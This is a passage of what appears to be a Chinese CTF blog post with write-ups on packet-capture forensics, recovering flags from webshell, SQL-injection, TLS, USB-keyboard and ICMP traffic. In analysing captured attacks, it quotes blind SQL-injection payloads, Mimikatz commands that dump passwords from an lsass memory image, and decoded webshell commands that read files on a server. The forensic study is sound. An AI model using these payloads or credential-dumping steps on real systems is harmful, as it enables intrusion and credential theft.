<li>再追踪一下这个包，发现应该是上传了<code>6666.jpg flag.txt hello.zip</code>这些文件，可以猜测上面拿到的password是压缩包的密码</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240310162851452.png" alt="image-20240310162851452"></p>
<ul>
<li>目标转化成找flag.txt 或 hellp.zip了,回到<code>http.request.uri contains &#39;/upload/1.php&#39;</code>的筛选列表里，通过z1的值来判断上传的文件，看来这个1364的包就是传hello.zip的包了</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240310163311760.png" alt="image-20240310163311760"></p>
<ul>
<li>追踪一下，发现了PK字眼，找到<code>hello.zip</code>了，开心😄</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240310163430226.png" alt="image-20240310163430226"></p>
<p><code>well,you need passwd!</code>也验证了我们的猜想，这个压缩包是需要密码的；并且可以看出来flag.txt应该在zip里面，接下来我们只需要把这个zip提取出来就好了。</p>
<ul>
<li><code>Show data as</code>选择 Raw，把最后面一段蓝色数据复制下来，在cyberchef中from hex，在输入窗口中搜索<code>504b0304</code>(zip 头)，定位后把前面的多余数据删掉即可</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240310164237676.png" alt="image-20240310164237676"></p>
<p>点击保存为zip</p>
<ul>
<li>zip提取需要密码，输入密码<code>Th1s_1s_p4sswd_!!!</code>，可以看到flag.txt</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240310164729838.png" alt="image-20240310164729838"></p>
<ul>
<li>get the flag</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;3OpWdJ-JP6FzK-koCMAK-VkfWBq-75Un2z&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>webshell流量有很多种，详情描述请查看：</strong></p>
<blockquote>
<p><a class="link" href="https://www.clementi.top/2023/06/21/%E5%B8%B8%E8%A7%81webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/index.html">常见webshell流量分析 | Clementi’s Blog <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<h4 id="0x02-NewStarCTF-公开赛赛道-最后的流量分析"><a href="#0x02-NewStarCTF-公开赛赛道-最后的流量分析" class="headerlink" title="0x02 [NewStarCTF 公开赛赛道]最后的流量分析"></a>0x02 [NewStarCTF 公开赛赛道]最后的流量分析</h4><ul>
<li>中等，重点在数据处理</li>
<li>拿到手过滤一下http，发现是sql盲注的流量</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240312211449095.png" alt="image-20240312211449095"></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if((substr((select(text)from(wfy_comments)where(id=100)),1,1)=%22q%22),100,0) </span><br></pre></td></tr></table></figure></div>

<p><strong>(substr((select(text)from(wfy_comments)where(id=100)),1,1)=%22q%22)：</strong>从wfy_comments表中选择id是100的列，然后使用该substr()函数提取第一个字符（从位置 1 开始、长度为 1 的子字符串），将提取的字符和q比较。</p>
<p><strong>if(…,100,0)：</strong>true返回100，false返回0。即?name=100或?name=0</p>
<p><strong>经过观察发现，不同的数据包修改的值是，提取字符的位置（substr的中间的参数），和=后面用于比较的字符，例如这个例子里的q</strong></p>
<ul>
<li>将数据包大小排序，经过观察，可以发现长度在768以上的返回的h2是<code>好耶！你有这条来自f1ag_is_here条留言</code>，长度在764以下的返回的是<code>啊哦，这条留言不存在哦～</code></li>
<li>通过<code>data-text-lines and frame.len &lt;= 768</code>直接过滤出注入成功的数据包（data-text-lines是过滤有text data的包，也就是返回html的包）</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240312220202763.png" alt="image-20240312220202763"></p>
<p>:raised_hands:<em>这里想跟大家分享一下写wireshark过滤的小技巧，如果你和我一样懒得查看英文手册的话:joy: ，找到你想筛选的数据，右键，apply as filter，任意选择selected或not，你就能看见这个字段的过滤应该怎么写了，再根据你实际想要达到的效果修改符号为不等于或大于小于等等。</em></p>
<ul>
<li>tshark+sed，直接在终端数据处理：</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">tshark -nr &quot;sqli.pcap&quot; -Y &quot;data-text-lines and frame.len &gt;= 768&quot; -T fields -e &quot;http.response_for.uri&quot;|sed &#x27;s/^.*)),//g&#x27;|sed &#x27;s/^.*=%22//g&#x27; |sed &#x27;s/%22.*$//g&#x27;|tr -d &#x27;\n&#x27;</span><br></pre></td></tr></table></figure></div>

<p>tshark的命令就不解释了，一开始拿到的数据是这样的：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/comments.php?name=if((substr((select(text)from(wfy_comments)where(id=100)),1,1)=%22f%22),100,0)</span><br></pre></td></tr></table></figure></div>

<p>来解释一下sed，s/和/中间的是正则表达式，执行替换功能，s/…/…/g的第一个…是正则的位置，第二个…是替换结果，//g是把符合正则的东西替换成空</p>
<ol>
<li><code>sed &#39;s/^.*)),//g&#39;</code>后：</li>
</ol>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1,1)=%22f%22),100,0)</span><br></pre></td></tr></table></figure></div>

<ol start="2">
<li><code>sed &#39;s/^.*=%22//g&#39; </code>后：</li>
</ol>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">f%22),100,0)</span><br></pre></td></tr></table></figure></div>

<ol start="3">
<li><code>sed &#39;s/%22.*$//g&#39;</code>后：</li>
</ol>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">f</span><br></pre></td></tr></table></figure></div>

<ol start="4">
<li><code>tr -d &#39;\n&#39;</code>删除换行符</li>
</ol>
<ul>
<li>最终得到flag:<code>flag&#123;c84bb04a-8663-4ee2-9449-349f1ee83e11&#125; </code>，<code>%7B</code>和<code>%7D</code>分别是url编码里的<code>&#123;</code>和<code>&#125;</code></li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240312225854294.png" alt="image-20240312225854294"></p>
<h4 id="0x03-sqltest"><a href="#0x03-sqltest" class="headerlink" title="0x03 sqltest"></a>0x03 sqltest</h4><ul>
<li><p>如题，应该知道是sql盲注的攻击流量，http过滤一下发现攻击者是在利用二分法盲注攻击</p>
</li>
<li><p>根据上道题目最后的流量分析，积累的经验，找到成功的数据包长度，应该是1095，失败的长度是1027；攻击者在套flag之前，先会通过二分法注入找flag字段的长度，所以我们应该只过滤验证flag具体内容的数据包</p>
</li>
<li><p>根据上述两条编写过滤规则：<code>http.response_for.uri contains &quot;ascii(substr(((select%20concat_ws(char(94&quot; and data-text-lines</code> 。</p>
<p><em>这里不能和上一题一样只过滤注入成功的包（长度为1095的包），因为我们需要通过一个成功和下一个的失败来判断具体的数据（例如现在的字符的ascii码是102，我们需要通过 &gt;101成功和&gt;102失败来验证ascii=102）</em></p>
</li>
<li><p>tshark 提取数据：</p>
</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">tshark -nr &quot;sqltest.pcapng&quot; -Y &#x27;http.response_for.uri contains &quot;ascii(substr(((select%20concat_ws(char(94&quot; and data-text-lines&#x27; -T fields -e &quot;frame.len&quot; -e &quot;http.response_for.uri&quot; | sed &#x27;s/http.*)),%20//g&#x27;|sed &#x27;s/,%201))&gt;/,/g&#x27; &gt; ~/Desktop/sqltest.txt</span><br></pre></td></tr></table></figure></div>

<p><img lazyload src="/images/loading.svg" data-src="./image-20240313230051394.png" alt="image-20240313230051394"></p>
<p>把包长度，当前字符位置，&gt;后面的数据提取出来</p>
<ul>
<li>python处理数据，得出flag</li>
</ul>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/Users/madison/Desktop/sqltest.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    lines = f.readlines()</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    count = <span class="string">&#x27;1&#x27;</span> <span class="comment">#当前的字符顺序</span></span><br><span class="line">    result = [<span class="number">0</span>,<span class="number">201</span>] <span class="comment">#result[0]用来存放低临界值，result[1]存放高临界值</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        ret =re.findall(<span class="string">r&#x27;\d+&#x27;</span>,line)</span><br><span class="line">        <span class="keyword">if</span>(count != ret[<span class="number">1</span>]):</span><br><span class="line">            count = ret[<span class="number">1</span>]</span><br><span class="line">            flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(result[<span class="number">1</span>]))</span><br><span class="line">            result = [<span class="number">0</span>,<span class="number">201</span>]</span><br><span class="line">        <span class="keyword">if</span> ret[<span class="number">0</span>] == <span class="string">&#x27;1095&#x27;</span> <span class="keyword">and</span> <span class="built_in">int</span>(ret[<span class="number">2</span>])&gt;result[<span class="number">0</span>]:</span><br><span class="line">            result[<span class="number">0</span>] = <span class="built_in">int</span>(ret[<span class="number">2</span>])</span><br><span class="line">        <span class="keyword">elif</span> ret[<span class="number">0</span>] == <span class="string">&#x27;1027&#x27;</span> <span class="keyword">and</span> <span class="built_in">int</span>(ret[<span class="number">2</span>])&lt;result[<span class="number">1</span>]:</span><br><span class="line">            result[<span class="number">1</span>] = <span class="built_in">int</span>(ret[<span class="number">2</span>])</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(result[<span class="number">1</span>]))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#flag&#123;47edb8300ed5f9b28fc54b0d09ecdef7&#125;</span></span><br></pre></td></tr></table></figure></div>

<h4 id="0x04-流量分析"><a href="#0x04-流量分析" class="headerlink" title="0x04 流量分析"></a>0x04 流量分析</h4><ul>
<li>题目hint</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">流量分析</span><br><span class="line">提示一：若感觉在中间某个容易出错的步骤，若有需要检验是否正确时，可以比较MD5: 90c490781f9c320cd1ba671fcb112d1c</span><br><span class="line">提示二：注意补齐私钥格式</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">XXXXXXX</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure></div>

<ul>
<li>中等，主要是不能被FTP里面的Fl-g.zip绕进去，我显然是被绕进去了🤮。一直在试图修zip，拿到里面的qr-code.jpg，大家一定要仔细琢磨提示。</li>
<li>tcp contains “KEY” 可以找到一串base64 的image</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240307203003473.png" alt="image-20240307203003473"></p>
<ul>
<li>from base64 cyberchef 得到一张图</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./download.png" alt="download"></p>
<ul>
<li>把这些提取出来（考眼力，做到这我已经疲惫了），按照提示补齐私钥，导入wireshark</li>
</ul>
<p>编辑-&gt;首选项-&gt;Protocols-&gt;TLS-&gt;RSA keys list Edit-&gt;添加key file-&gt;完成</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIICXAIBAAKBgQDCm6vZmclJrVH1AAyGuCuSSZ8O+mIQiOUQCvN0HYbj8153JfSQ</span><br><span class="line">LsJIhbRYS7+zZ1oXvPemWQDv/u/tzegt58q4ciNmcVnq1uKiygc6QOtvT7oiSTyO</span><br><span class="line">vMX/q5iE2iClYUIHZEKX3BjjNDxrYvLQzPyGD1EY2DZIO6T45FNKYC2VDwIDAQAB</span><br><span class="line">AoGAbtWUKUkx37lLfRq7B5sqjZVKdpBZe4tL0jg6cX5Djd3Uhk1inR9UXVNw4/y4</span><br><span class="line">QGfzYqOn8+Cq7QSoBysHOeXSiPztW2cL09ktPgSlfTQyN6ELNGuiUOYnaTWYZpp/</span><br><span class="line">QbRcZ/eHBulVQLlk5M6RVs9BLI9X08RAl7EcwumiRfWas6kCQQDvqC0dxl2wIjwN</span><br><span class="line">czILcoWLig2c2u71Nev9DrWjWHU8eHDuzCJWvOUAHIrkexddWEK2VHd+F13GBCOQ</span><br><span class="line">ZCM4prBjAkEAz+ENahsEjBE4+7H1HdIaw0+goe/45d6A2ewO/lYH6dDZTAzTW9z9</span><br><span class="line">kzV8uz+Mmo5163/JtvwYQcKF39DJGGtqZQJBAKa18XR16fQ9TFL64EQwTQ+tYBzN</span><br><span class="line">+04eTWQCmH3haeQ/0Cd9XyHBUveJ42Be8/jeDcIx7dGLxZKajHbEAfBFnAsCQGq1</span><br><span class="line">AnbJ4Z6opJCGu+UP2c8SC8m0bhZJDelPRC8IKE28eB6SotgP61ZqaVmQ+HLJ1/wH</span><br><span class="line">/5pfc3AmEyRdfyx6zwUCQCAH4SLJv/kprRz1a1gx8FR5tj4NeHEFFNEgq1gmiwmH</span><br><span class="line">2STT5qZWzQFz8NRe+/otNOHBR2Xk4e8IS+ehIJ3TvyE=</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure></div>

<p><img lazyload src="/images/loading.svg" data-src="./image-20240307204942387.png" alt="image-20240307204942387"></p>
<ul>
<li>然后就可以看到http</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240307204958136.png" alt="image-20240307204958136"></p>
<ul>
<li>终于，flag</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240307204857654.png" alt="image-20240307204857654"></p>
<ul>
<li>参考</li>
</ul>
<blockquote>
<p>这位师傅做这道题的心路历程和我差不多😭：<a class="link" href="https://fengyuhetao.github.io/posts/22230/#%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90">ddctf2018 · Tianji’s Blog (fengyuhetao.github.io) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<h4 id="0x05-安洵杯2019-Attack"><a href="#0x05-安洵杯2019-Attack" class="headerlink" title="0x05 [安洵杯2019] Attack"></a>0x05 [安洵杯2019] Attack</h4><ul>
<li>中等</li>
<li>看到了upload，先binwalk看看里面有啥东西，能看到里面有个zip，zip里面有个flag.txt，但是zip是加密的，用foremost把zip提取出来</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240314184142874.png" alt="image-20240314184142874"></p>
<ul>
<li>丢进010先看看是不是伪加密，可惜不是伪加密，同时看到flag.txt有一个注释：<code>这可是administrator的秘密，怎么能随便给人看呢？</code></li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240314184428929.png" alt="image-20240314184428929"></p>
<ul>
<li>回到wireshark，export objects-&gt;http，看到里面有一个lsass.dmp</li>
</ul>
<p><strong>lsass是windows系统的一个进程，用于本地安全和登陆策略。mimikatz可以从 lsass.exe 里获取windows处于active状态账号明文密码。本题的lsass.dmp就是内存运行的镜像，也可以提取到账户密码</strong></p>
<p>结合注释，应该是需要通过mimikatz提取这个dump里面的账户密码</p>
<blockquote>
<p>[BUU MISC刷题记录 <a class="link" href="https://www.cnblogs.com/yunqian2017/p/14992169.html">安洵杯 2019]Attack - 云千 - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<p>Mimikatz：<a class="link" href="https://github.com/gentilkiwi/mimikatz">gentilkiwi/mimikatz: A little tool to play with Windows security (github.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<ul>
<li>mimikatz提取</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">//提升权限</span><br><span class="line">privilege::debug</span><br><span class="line">//载入dmp文件</span><br><span class="line">sekurlsa::minidump lsass.dmp</span><br><span class="line">//读取登陆密码</span><br><span class="line">sekurlsa::logonpasswords full</span><br></pre></td></tr></table></figure></div>

<p><img lazyload src="/images/loading.svg" data-src="./image-20240314185043343.png" alt="image-20240314185043343"></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Username：Administrator</span><br><span class="line">Password: W3lc0meToD0g3</span><br></pre></td></tr></table></figure></div>

<ul>
<li>用password打开压缩包，打开flag.txt，最底部是flag：<code>flag&#123;3466b11de8894198af3636c5bd1efce2&#125;</code></li>
</ul>
<h4 id="0x06-BSidesSF2019-table-tennis"><a href="#0x06-BSidesSF2019-table-tennis" class="headerlink" title="0x06 [BSidesSF2019]table-tennis"></a>0x06 [BSidesSF2019]table-tennis</h4><ul>
<li>中等，icmp数据处理</li>
<li>发现icmp有data，里面有一些数据，能看到&lt;html&gt;等信息</li>
<li>用tshark把data先提取出来：</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">tshark -nr &quot;tabletennis.pcapng&quot; -Y &#x27;icmp.resp_to&#x27; -T fields -e &quot;data.data&quot;</span><br></pre></td></tr></table></figure></div>

<p>发现每个包里面有很多重复数据，一个包里面大概有5份重复数据，一个icmp包data数据块一共是40bytes，里面一份数据是8bytes</p>
<ul>
<li>利用cut只提取第二个8bytes：<code>cut -c 17,32</code>，-c表示按照字符切割，前面有16个字符（8bytes），故从第17位开始往后提取16个到第32位；再xxd把hex转成文本</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">tshark -nr &quot;tabletennis.pcapng&quot; -Y &#x27;icmp.resp_to&#x27; -T fields -e &quot;data.data&quot; |cut -c 17-32 | xxd -r -p</span><br></pre></td></tr></table></figure></div>

<p><img lazyload src="/images/loading.svg" data-src="./image-20240314225618844.png" alt="image-20240314225618844"></p>
<p>很容易注意到script标签下的这行数据：<code>Q1RGe0p1c3RBUzBuZ0FiMHV0UDFuZ1Awbmd9</code>，base64解码</p>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240314225708405.png" alt="image-20240314225708405"></p>
<ul>
<li>得到flag:<code>flag&#123;JustAS0ngAb0utP1ngP0ng&#125;</code></li>
</ul>
<h4 id="0x07-XMAN2018排位赛-AutoKey"><a href="#0x07-XMAN2018排位赛-AutoKey" class="headerlink" title="0x07 [XMAN2018排位赛]AutoKey"></a>0x07 [XMAN2018排位赛]AutoKey</h4><ul>
<li>中等，键盘流量，使用工具：<a class="link" href="https://github.com/FzWjScJ/knm">FzWjScJ/knm: 鼠标键盘流量包取证 (github.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>先提取usb里的data</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240315185830311.png" alt="image-20240315185830311"></p>
<ul>
<li>利用工具，把记录的data转成键盘输入</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240315185950254.png" alt="image-20240315185950254"></p>
<p>按照原始数据显示的话会把功能键打印出来&lt;CAP&gt;&lt;DEL&gt;这些</p>
<ul>
<li>可以看到autokey().decipher，使用的是autokey加密，由于密钥不知道，我们需要使用<strong>autokey爆破工具</strong>：<a class="link" href="https://github.com/hotzzzzy/breakautokey">hotzzzzy/breakautokey: breakautokey (github.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<p><em>其实我还找到一个在线网站，但这里不是很准确，先留存一下，以后可以试试：<a class="link" href="https://www.guballa.de/vigenere-solver">Vigenere Solver | guballa.de <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></em></p>
<ul>
<li>在<strong>python2</strong>的环境下，需要有pycipher包</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240315190256424.png" alt="image-20240315190256424"></p>
<p>可以看见key为“FLAGHERE”时，是一串有意义的英文，加上空格</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">klen 8 :&quot;FLAGHERE&quot;, HELLO BOYS AND GIRLS YOU ARE SO SMART THAT YOU CAN FIND THE FLAG THAT I HIDE IN THE KEYBOARD PACKAGE FLAG IS JHAWLZKEWXHNCDHSLWBAQJTUQZDXZQPF</span><br></pre></td></tr></table></figure></div>

<ul>
<li>flag:<code>flag&#123;JHAWLZKEWXHNCDHSLWBAQJTUQZDXZQPF&#125;</code></li>
</ul>
<h4 id="0x08-羊城杯-2020-TCP-IP"><a href="#0x08-羊城杯-2020-TCP-IP" class="headerlink" title="0x08 [羊城杯 2020]TCP_IP"></a>0x08 [羊城杯 2020]TCP_IP</h4><ul>
<li>中等，流量包协议不多，数据处理部分简单，但有两个点：ip数据报隐写和base91加密比较难想</li>
<li>wireshark打开，很多tcp，追踪发现是一段对话，拿tshark摘出来，发现没有什么用，，，，被耍了</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240315201924446.png" alt="image-20240315201924446"></p>
<ul>
<li>接下来这个点就有点难想了，需要对TCPIP隐写有一定的了解或者要善于发现，IP协议中的identification看似是随机的，实则是出题人故意设置的（<em>又积累经验了</em>），想到这一点就很简单，拿tshark提取就好了</li>
</ul>
<blockquote>
<p>原理：<a class="link" href="https://www.anquanke.com/post/id/85929">【技术分享】基于TCP/IP协议栈的隐写术和隐蔽通道（part 1）-安全客 - 安全资讯平台 (anquanke.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">tshark -nr &quot;TCP_IP.pcap&quot; -Y &#x27;tcp&#x27; -T fields -e &quot;ip.id&quot;|sed &#x27;s/0x00//g&#x27;|tr -d &#x27;\n&#x27;</span><br></pre></td></tr></table></figure></div>

<p><img lazyload src="/images/loading.svg" data-src="./image-20240315202138650.png" alt="image-20240315202138650"></p>
<ul>
<li>拿到这一串之后，xxd一下把hex解码了</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240315202209975.png" alt="image-20240315202209975"></p>
<p>数据有一部分有重复，一定要仔细，，，否则有些工具没法识别是标准的base编码</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">@iH&lt;,&#123;*;oUp/im&quot;QPl`yR*ie&#125;NK;.D!Xu)b:J[Rj+6KKM7P</span><br></pre></td></tr></table></figure></div>

<p><em>😊问题又来了，看到这一串你能否想到是base91呢，我没想到（又积累经验了），对basefamily了解不深，只会丢给cyberchef，所以我决定开始使用basecrack，看不出啥编码的先拿这工具单扫一遍：</em></p>
<blockquote>
<p> basecrack：<a class="link" href="https://github.com/Xzeroxvan07/basecrack-1">Xzeroxvan07/basecrack-1: Decode All Bases - Base Scheme Decoder (github.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>*</p>
</blockquote>
<p><em>用了发现确实挺好用</em></p>
<ul>
<li>flag：<code>flag&#123;wMt84iS06mCbbfuOfuVXCZ8MSsAFN1GA&#125; </code></li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240315202912219.png" alt="image-20240315202912219"></p>
<h4 id="0x09-BSidesSF2019-thekey"><a href="#0x09-BSidesSF2019-thekey" class="headerlink" title="0x09 [BSidesSF2019]thekey"></a>0x09 [BSidesSF2019]thekey</h4><ul>
<li>键盘流量，中等偏简单，归于中等的原因是有几个点需要注意</li>
<li>用工具提取流量</li>
</ul>
<p><strong>我先用的knm这个脚本，但是提取出来的数据不够完整</strong></p>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240315214012201.png" alt="image-20240315214012201"></p>
<p>按照这个myfavoritte这些是没有中间的_，两边也没有{，交上去是错的</p>
<p><strong>建议多个脚本试试看，所以我使用了另一个脚本：UsbKeyboardDataHacker，这个是完整的信息</strong></p>
<blockquote>
<p><a class="link" href="https://github.com/WangYihang/UsbKeyboardDataHacker">WangYihang/UsbKeyboardDataHacker: USB键盘流量包取证工具 , 用于恢复用户的击键信息 (github.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240315214200003.png" alt="image-20240315214200003"></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">viim&lt;SPACE&gt;flaag.ttxt&lt;RET&gt;iTthe&lt;SPACE&gt;flaag&lt;SPACE&gt;is&lt;SPACE&gt;ctf&lt;ESC&gt;vbUuA&#123;[my_favoritte_editor_is_vim&#125;&lt;ESC&gt;hhhhhhhhhhhhhhhhhhhau&lt;ESC&gt;vi&#123;U&lt;ESC&gt;:;wq&lt;RET&gt;</span><br></pre></td></tr></table></figure></div>

<p>可以看到用了vim，这就要求对vim熟悉了，，，复盘一下这个键盘输入，得到，但其实那个favouritte里的U经过h回退应该在r后面，但这样是错的，我怀疑是前面有字符不属于vim里的键盘输入，比如<code>[</code></p>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240315214532882.png" alt="image-20240315214532882"></p>
<ul>
<li>解释一下vim编辑器里的按键</li>
</ul>
<p><code>i</code>启动insert模式，插入字符；&lt;ESC&gt;退出insert模式；<code>v</code>启动visual模式，可以选择文本；<code>i&#123;</code>选择当前大括号对内的文本{…}，在本例中为my_favoritte_editor_is_vim；<code>U</code>是将所选文本转换为大写的命令；<code>b</code>后移一个单词，光标停在上一个单词开头；<code>h</code> 左移一个字符</p>
<ul>
<li>flag:<code>flag&#123;MY_FAVORITTE_EDITOR_IS_VIM&#125;</code></li>
</ul>
<h4 id="0x0A-NewStarCTF-公开赛赛道-WebShell！"><a href="#0x0A-NewStarCTF-公开赛赛道-WebShell！" class="headerlink" title="0x0A [NewStarCTF 公开赛赛道]WebShell！"></a>0x0A [NewStarCTF 公开赛赛道]WebShell！</h4><ul>
<li>中等，蚁剑流量，flag{WebShell密码_黑客获取的用户名_机密文件内容} </li>
<li>先过滤<code>http</code>,Get请求里没什么东西，重点看<strong>POST请求</strong>，过滤<code>http.request.method==POST</code></li>
<li>因为是蚁剑流量，蚁剑流量的一个特征就是<code>@ini_set()</code>,对应的key就是webshell连接密码，这里是<code>n3wst4r</code></li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240318191022439.png" alt="image-20240318191022439"></p>
<ul>
<li>接着按顺序依次追踪POST请求数据包，看里面的php代码，以及打印的内容，这里只挑关键的流的关键部分来讲</li>
</ul>
<p>参数<strong>h37e8ca57159a8</strong>的值和执行的命令有关，因此只需要每次注意这个参数，就能知道这个包主要执行了什么命令</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//tcp.stream eq 34</span></span><br><span class="line">g883299482ed9b=BUL2Jpbi9zaA==&amp;h37e8ca57159a8=hvY2QgIi92YXIvd3d3L2h0bWwiO3dob2FtaTtlY2hvIGQwZjRhNjhhO3B3ZDtlY2hvIDI1ZTcw&amp;n3wst4r=@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;03d&quot;</span>.<span class="string">&quot;a0f8&quot;</span>;<span class="keyword">echo</span> @<span class="title function_ invoke__">asenc</span>(<span class="variable">$output</span>);</span><br><span class="line"><span class="variable">$s</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;h37e8ca57159a8&quot;</span>],<span class="number">2</span>));</span><br></pre></td></tr></table></figure></div>

<p><code>substr($_POST[&quot;h37e8ca57159a8&quot;],2)</code>从第三位字母开始截取，因此base64解码<strong>Y2QgIi92YXIvd3d3L2h0bWwiO3dob2FtaTtlY2hvIGQwZjRhNjhhO3B3ZDtlY2hvIDI1ZTcw</strong>，得到<code>cd &quot;/var/www/html&quot;;whoami;echo d0f4a68a;pwd;echo 25e70</code>;结合代码分析，在<code>echo 03da0f8 </code>之后会打印<code>whoami</code>，对应到下面的输出，拿到用户名<code>www-data</code></p>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240318192650352.png" alt="image-20240318192650352"></p>
<p>继续追踪流，找机密文件内容，同理，分析参数即可，在下面的参数中出现了<code>cat /secret</code>，很容易想到secret就是机密文件</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">g883299482ed9b=BRL2Jpbi9zaA==&amp;h37e8ca57159a8=GlY2QgIi92YXIvd3d3L2h0bWwiO2NhdCAvc2VjcmV0O2VjaG8gZDBmNGE2OGE7cHdkO2VjaG8gMjVlNzA=&amp;n3wst4r=@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line"><span class="comment">//Y2QgIi92YXIvd3d3L2h0bWwiO2NhdCAvc2VjcmV0O2VjaG8gZDBmNGE2OGE7cHdkO2VjaG8gMjVlNzA=经过base64解码后为cd &quot;/var/www/html&quot;;cat /secret;echo d0f4a68a;pwd;echo 25e70</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;aac&quot;</span>.<span class="string">&quot;1c1&quot;</span>;<span class="keyword">echo</span> @<span class="title function_ invoke__">asenc</span>(<span 